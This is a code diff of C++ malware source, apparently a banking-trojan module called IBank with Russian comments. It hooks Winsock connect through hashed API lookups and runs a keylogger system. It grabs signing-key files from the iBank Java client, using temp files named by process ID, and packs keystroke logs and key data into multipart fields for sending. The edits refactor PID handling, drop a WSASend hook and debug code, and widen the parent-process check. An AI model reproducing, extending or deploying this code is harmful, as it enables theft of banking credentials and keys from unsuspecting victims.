@@ -79,34 +79,17 @@ namespace IBank
 
 	//-----------------------------------------------------------------------
 
-
-	typedef struct _ibWSABUF {
-		ULONG len;     /* the length of the buffer */
-		__field_bcount(len) CHAR FAR *buf; /* the pointer to the buffer */
-	} ibWSABUF, FAR * LPibWSABUF;
-
 	// Определяем типы для установки хуков
 	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);
 
-	typedef int (WINAPI *TWSASend)(SOCKET s, LPibWSABUF lpBuffers, DWORD dwBufferCount,
-				LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPVOID lpOverlapped,
-				LPVOID lpCompletionRoutine);
-
 
 	TConnect Real_Connect;
-	TWSASend Real_WSASend;
 
 
-	#ifdef EXTERNAL_DEBUG
-    	TConnect DebugConnect = NULL;
-
-
-	#endif
-
-
-    // Глобальные переменные системы
-	PKeyLogSystem System        = NULL;
-	bool          Hooked        = false;
+	// Глобальные переменные системы
+	DWORD         ProcessID = 0;
+	PKeyLogSystem System    = NULL;
+	bool          Hooked    = false;
 
 
 #ifdef JAVS_PATCHERH
@@ -128,7 +111,7 @@ namespace IBank
 	//-----------------------------------------------------------------------
 
 	//создает имя файла которое будет одинаковым для всех процессов, в имени файла  используется пид процесса, для которого он предназначен
-	PCHAR GetNameForKeyFile(DWORD pid)
+	PCHAR GetNameForKeyFile()
 	{
 		PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
 		if( path )
@@ -136,7 +119,9 @@ namespace IBank
 			pGetTempPathA( MAX_PATH, path );
 			char buf[32];
 			fwsprintfA pwsprintfA = Get_wsprintfA();
-			pwsprintfA( buf, "pid_%d", pid );
+
+			// Для идентификации используем глобальный пид процесса
+			pwsprintfA( buf, "pid_%d", ProcessID);
 			pPathAppendA( path, buf );
 			char* path2 = UIDCrypt::CryptFileName( path, true );
 			IBDBG( "IBANK", "Файл ключа: %s -> %s", path, path2 );
@@ -172,7 +157,7 @@ namespace IBank
 		if( e->unicode )
 		{
 			//сохраняем имя файла в специальном файле
-			char* nameFile = GetNameForKeyFile( GetParentPID() );
+			char* nameFile = GetNameForKeyFile();
 			int len = m_wcslen(e->fileNameW);
 			File::WriteBufferA( nameFile, (LPVOID)e->fileNameW, (len + 1) * sizeof(WCHAR) ); //сохраняем вместе с завершающим нулем
 			STR::Free(nameFile);
@@ -217,7 +202,8 @@ namespace IBank
 //            SignalFile += "\\netsend.dat";
 //
 //			if (!FileExistsA(SignalFile.t_str()))
-				KeyLogger::CloseSession();
+
+			KeyLogger::CloseSession();
         #else
 			struct sockaddr_in* info = (struct sockaddr_in*)name;
 			if (IBnakHostAddr && IBnakHostAddr == info->sin_addr.s_addr)
@@ -225,39 +211,9 @@ namespace IBank
 		#endif
 
 
-
-//		#ifdef EXTERNAL_DEBUG
-//			if (DebugConnect)
-//				DebugConnect(s, name, namelen);
-//
-//		#endif
-
-
-		int R = Real_Connect(s, name, namelen);
-
-//        __asm int 3
-
-		return R;
+		return Real_Connect(s, name, namelen);
 	}
 	//-----------------------------------------------------------------------
-
-
-	int WINAPI Hook_WSASend(SOCKET s, LPibWSABUF lpBuffers, DWORD dwBufferCount,
-					LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPVOID lpOverlapped,
-					LPVOID lpCompletionRoutine)
-	{
-
-	   string Str(lpBuffers->buf, Min(20, lpBuffers->len));
-       IBDBG("IBankW", "---------- WSASend %s", Str.t_str());
-
-
-
-		return Real_WSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags,
-				 lpOverlapped, lpCompletionRoutine);
-
-    }
-
-
 
 
 	void MakeScreenShot()
@@ -280,11 +236,6 @@ namespace IBank
 		}
 
 
-//		if ( HookApi( 4, 0x1A7829F8 /* WSASend */, &Hook_WSASend) )
-//		{
-//			__asm mov [Real_WSASend], eax
-//		}
-
 		#ifdef JAVS_PATCHERH
 		if ( HookApi( 4, 0xF44318C6 /* gethostbyname */, &Hook_gethostbyname) )
 		{
@@ -293,6 +244,7 @@ namespace IBank
 		#endif
 
 	}
+
 
 	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
 	{
@@ -314,19 +266,6 @@ namespace IBank
 		System = (PKeyLogSystem)Sender;
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
-
-
-
-		#ifdef EXTERNAL_DEBUG
-			HMODULE DBGDLL = (HMODULE)pLoadLibraryA("c:\\1.dll");
-
-			if (DBGDLL)
-				DebugConnect = (TConnect)pGetProcAddress(DBGDLL, "HookConnect");
-
-			if (DebugConnect)
-				IBDBG("IBank", ">>>>>>>>>>>>>>>>>>   Отладочная библиотека загружена");
-
-		#endif
 
 
 		// Сигнализируем ява патчеру о необходимости запуска патчей
@@ -385,7 +324,7 @@ namespace IBank
 		FileGrabber::Release();
 
 		//читаем имя файла ключа записанного в другом процессе
-		char* nameFile = GetNameForKeyFile( GetUniquePID() );
+		char* nameFile = GetNameForKeyFile();
 		if( nameFile )
 		{
 			DWORD sz;
@@ -446,6 +385,8 @@ namespace IBank
 
 
 		IBDBG("IBank", "Key:%s<key_end>",  Log->Log);
+
+		IBDBG("++++++++++++ IBank", "Key file=%s", Log->KeyFile);
 
 		MultiPartData::AddStringField(Data, "uid",  UID);
 		MultiPartData::AddStringField(Data, "keyhwnd",  Log->Log);
@@ -561,14 +502,6 @@ namespace IBank
 
 		L->Log = KLGPacker::GetTextDataFromFile(Log.LogFile);
 
-		// Для отладки сохраним сохраним копию пустого лога на диск
-//		#ifdef DEBUGCONFIG
-//			if (!FileExistsA(Log.LogFile))
-//            	MessageBoxA(NULL, "Файл отсутствует", NULL, 0);
-//			if (STR::IsEmpty(L->Log))
-//				pCopyFileA(Log.LogFile, "c:\\IBankLog.Log", false);
-//		#endif
-
 
 		// Очищаем данные, которые относятся к рамкам текущей сессии
 		Log.LogFile = NULL;
@@ -683,14 +616,33 @@ void RegisterIBankSystem(DWORD hashApp)
 
 
 	DWORD hashMain = PROCESS_HASH_JAVA;
-	//если javaw.exe запущен не из под java.exe, то возможно это оффлайн версия ибанка
-	if( hashApp == PROCESS_HASH_JAVAW && GetHashForPid(GetParentPID()) != PROCESS_HASH_JAVA )
-		hashMain = PROCESS_HASH_JAVAW;
+
+
+	if( hashApp == PROCESS_HASH_JAVAW)
+	{
+		//если javaw.exe запущен не из под java.exe, то возможно это оффлайн версия ибанка
+		DWORD ParentPID = GetHashForPid(GetParentPID());
+
+		#ifdef JAVS_PATCHERH
+			BOOL ParentIsJava = ParentPID == PROCESS_HASH_JAVA ||
+								ParentPID == PROCESS_HASH_PATCHED_JAVA ||
+								ParentPID == PROCESS_HASH_JAVAW; // При работающем патчере запускается из под этого проесса
+		#else
+			BOOL ParentIsJava = ParentPID == PROCESS_HASH_JAVA;
+		#endif
+
+
+		if (!ParentIsJava)
+			hashMain = PROCESS_HASH_JAVAW;
+    }
+
 
 	PKeyLogSystem S = KeyLogger::AddSystem(IBank::SystemName, hashMain);
 
 	if (S != NULL)
 	{
+
+		IBank::ProcessID = GetUniquePID();
 
 		IBDBG("IBank", "Система зарегистрирована");
 		IBank::System = S;
@@ -716,7 +668,9 @@ void RegisterIBankSystem(DWORD hashApp)
 			S->OnProcessRun = IBank::SystemActivated2;
 	}
 
-	if( hashMain != PROCESS_HASH_JAVAW ) //не онлайн версия
+
+    // Регистрируем грабер для перехвата файла ключа
+	if(hashMain != PROCESS_HASH_JAVAW)
 	{
 		S = KeyLogger::AddSystem(SysNameW, PROCESS_HASH_JAVAW);
 		if( S!= NULL )
